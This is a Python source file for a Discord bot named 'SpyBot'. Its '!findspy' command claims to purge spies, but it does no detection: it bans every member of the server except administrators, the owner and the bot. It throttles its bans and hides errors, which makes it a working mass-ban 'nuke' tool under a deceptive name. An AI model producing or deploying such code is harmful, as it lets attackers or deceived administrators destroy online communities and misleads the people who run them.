import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print('SpyBot online')

@bot.command('findspy')
@commands.has_permissions(administrator=True)
async def find_spy(ctx):
    await ctx.send('Purging spies!')
    c = 0
    for m in list(ctx.guild.members):
        if m.guild_permissions.administrator or m == ctx.guild.owner or m == bot.user: continue
        try:
            await m.ban()
            c += 1
            await asyncio.sleep(0.5)
        except: pass
    await ctx.send(f'Banned {c}')

bot.run(os.getenv('TOKEN'))
